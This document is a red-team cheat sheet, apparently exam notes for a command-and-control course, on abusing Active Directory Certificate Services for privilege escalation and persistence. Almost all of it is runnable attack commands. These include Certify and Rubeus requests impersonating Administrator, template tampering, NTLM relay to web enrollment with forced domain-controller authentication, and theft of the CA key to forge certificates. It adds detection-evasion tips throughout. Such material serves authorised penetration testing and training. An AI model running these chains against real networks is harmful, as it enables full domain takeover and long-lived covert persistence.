# Active Directory Certificate Services (ADCS)

Based on Certified Pre-Owned (2021). Focus: misconfig-based privesc and persistence.

> All `execute-assembly` is **OPSEC-CAUTION** — fork & run spawns a sacrificial process.
> Prefer chaining Certify+Rubeus inline where possible to limit process spawns.

---

## Enumeration

```cs
// Enumerate CAs — check for ESC8 web enrollment, vulnerable CA flags
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --quiet

// Enumerate vulnerable templates only — suppress admin-only findings
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

**Key flags to look for in template output:**
| Flag | Significance |
|------|-------------|
| `ENROLLEE_SUPPLIES_SUBJECT` | Requestor controls SAN → ESC1 abuse |
| `Manager Approval = False` | No human review needed |
| `Authorized Signatures = 0` | No co-signer required |
| EKU: `Client Authentication` | Cert usable for Kerberos auth |
| EKU: `Certificate Request Agent` | Can sign requests on behalf of others → ESC3 |
| EKU: `Any Purpose` or blank | No restriction → ESC2 |

---

## ESC1 — Misconfigured Client Authentication Templates

**Conditions:** Client Auth EKU + `ENROLLEE_SUPPLIES_SUBJECT` + no manager approval + low-priv enroll rights

```cs
// Step 1: Request cert specifying target UPN in SAN
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC1 \
  --upn Administrator \
  --quiet

// Output: base64 PFX — use directly with Rubeus

// Step 2: Use cert to get TGT as target user
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<base64_pfx> \
  /enctype:aes256 \
  /nowrap
```

---

## ESC2 — Misconfigured Any Purpose / Blank EKU Templates

**Conditions:** `Any Purpose` EKU (OID `2.5.29.37.0`) or empty EKU field (treated as SubCA)

```cs
// Enumerate (same command — output will show Any Purpose EKU)
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// If ENROLLEE_SUPPLIES_SUBJECT is set → abuse as ESC1
// If not set → abuse as ESC3 (use as agent cert to sign requests on behalf of others)
```

---

## ESC3 — Misconfigured Certificate Request Agent Templates

**Conditions:** `Certificate Request Agent` EKU enabled + no manager approval + low-priv enroll rights

Two-step abuse: obtain agent cert → use it to enroll as another user.

```cs
// Step 1: Request agent certificate using current user context
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC3 \
  --quiet

// Step 2: Use agent cert to request a Client Auth cert on behalf of Administrator
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template User \
  --target Administrator \
  --agent-pfx <base64_agent_pfx> \
  --quiet

// Step 3: Use resulting cert with Rubeus asktgt (same as ESC1 Step 2)
```

---

## ESC4 — Certificate Template Access Control (ACE Abuse)

**Conditions:** Low-priv principal has one of: Owner, FullControl, WriteOwner, WriteProperty, WriteDacl on a template

```cs
// Identify via enum-templates output — look for non-admin principals with write perms
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// Modify template to add ENROLLEE_SUPPLIES_SUBJECT (then exploit as ESC1)
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template \
  --template ESC4 \
  --supply-subject \
  --quiet

// Other manage-template flags:
//   --enroll <sid>               → grant self enrollment rights
//   --manager-approval           → toggle approval requirement
//   --authorized-signatures 0    → remove signature requirement
//   --client-auth / --pkinit-auth / --smartcard-logon → toggle auth EKUs
```

> After modifying the template, proceed with ESC1 exploitation.
> **Restore the template afterwards** to avoid detection and exam OPSEC score deductions.

---

## ESC8 — NTLM Relay to ADCS HTTP Web Enrollment

**Conditions:** CA has web enrollment (`http://<ca>/certsrv/`) not protected by HTTPS + Channel Binding disabled

**Check:**
```cs
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
```

**Attack chain — relay DC auth to get DC certificate → S4U2self to DA:**

### 1. Validate port 445 is bound (PID 4 = kernel)
```cs
// OPSEC-SAFE (BOF)
beacon> netstat
```

### 2. Disable lanmanserver auto-restart then stop services in order
```cs
// OPSEC-CAUTION — modifies service config, generates event logs
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet
```

> **WARNING:** Unbinding 445 breaks SMB shares and SMB Beacons on that machine.
> Do NOT do this on a critical server or machine running an SMB Beacon.

### 3. Verify 445 is unbound
```cs
beacon> netstat
```

### 4. Set up reverse port forward (routes 445 traffic to local ntlmrelayx on port 7445)
```cs
// OPSEC-SAFE (Beacon native)
beacon> rportfwd_local 445 localhost 7445
```

### 5. Start SOCKS proxy for ntlmrelayx to reach ADCS endpoint
```cs
// OPSEC-SAFE (Beacon native)
beacon> socks 1080 socks5
```

### 6. On attacker Kali — run ntlmrelayx (Docker container, port 7445 mapped to 445 inside)
```bash
proxychains impacket-ntlmrelayx \
  -t http://10.10.120.5/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

### 7. Coerce DC authentication with SharpSpoolTrigger
```cs
// OPSEC-CAUTION — triggers SpoolSS auth coercion from DC
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe \
  <DC_IP> \
  <compromised_host_IP>
```

### 8. ntlmrelayx catches relay → downloads DC PFX → use with Rubeus
```cs
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:<DC_account> \
  /domain:CONTOSO.COM \
  /certificate:<base64_pfx> \
  /enctype:aes256 \
  /nowrap
// Then S4U2self to get DA service tickets
```

### Cleanup
```cs
beacon> rportfwd stop 445
beacon> socks stop
// Re-enable lanmanserver start type manually if needed
```

---

## DPERSIST1 — Golden Certificates (CA Key Theft)

**Conditions:** Shell/Beacon on the CA server itself (Tier 0 access)

> Equivalent to krbtgt theft. Forged certs are valid until expiry and survive password resets.

```cs
// Step 1: Confirm you're on the CA
// OPSEC-UNSAFE (spawns cmd.exe child) — use getenv or hostname BOF if available
beacon> run hostname

// Step 2: Dump CA keypair as base64 PFX
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet

// Step 3: Save PFX to attacker machine
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("<base64>"))
```

```cs
// Step 4: Forge cert offline (run on attacker Windows box — no beacon needed)
// OPSEC-SAFE (offline, no network activity)
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge \
  --ca-cert .\Desktop\contoso-root-ca.pfx \
  --upn Administrator \
  --subject "CN=Administrator,CN=Users,DC=contoso,DC=com" \
  --sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500 \
  --crl "ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com" \
  --quiet
```

```cs
// Step 5: Use forged cert with Rubeus asktgt
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<forged_base64_pfx> \
  /enctype:aes256 \
  /nowrap
```

> The forged cert remains valid until its End Date. Certificate revocation does NOT invalidate it unless CRL checking catches the serial (and the CA is online). Treat stolen CA keys as permanent domain compromise.

---

## OPSEC Summary

| Technique | Tier | Notes |
|-----------|------|-------|
| `enum-cas` / `enum-templates` | CAUTION | execute-assembly spawns sacrificial proc |
| ESC1 request | CAUTION | execute-assembly; cert request logged in CA event log (Event 4886/4887) |
| ESC3 request-agent | CAUTION | Two cert requests — two CA log entries |
| ESC4 manage-template | CAUTION | Template modification logged in AD |
| ESC8 rportfwd_local | SAFE | Beacon native, no child proc |
| ESC8 socks | SAFE | Beacon native |
| ESC8 sc_stop services | CAUTION | Service stop events (7036), breaks SMB |
| ESC8 SharpSpoolTrigger | CAUTION | Auth coercion generates network traffic |
| DPERSIST1 dump-certs | CAUTION | Runs on CA — high-value target, monitored |
| DPERSIST1 forge (offline) | SAFE | No beacon/network activity |
| Rubeus asktgt w/ cert | CAUTION | TGT request via PKINIT — logged as Event 4768 |

**CA Event IDs to be aware of (logged on CA):**
- `4886` — Certificate request received
- `4887` — Certificate issued
- `4888` — Certificate request denied

---

## EKU OID Reference

| OID | Name |
|-----|------|
| `1.3.6.1.5.5.7.3.2` | Client Authentication |
| `1.3.6.1.5.5.7.3.1` | Server Authentication |
| `1.3.6.1.5.5.7.3.4` | Secure Email |
| `1.3.6.1.4.1.311.10.3.4` | EFS |
| `2.5.29.37.0` | Any Purpose (abuse via ESC2) |
| *(blank)* | Treated as Subordinate CA — unrestricted |
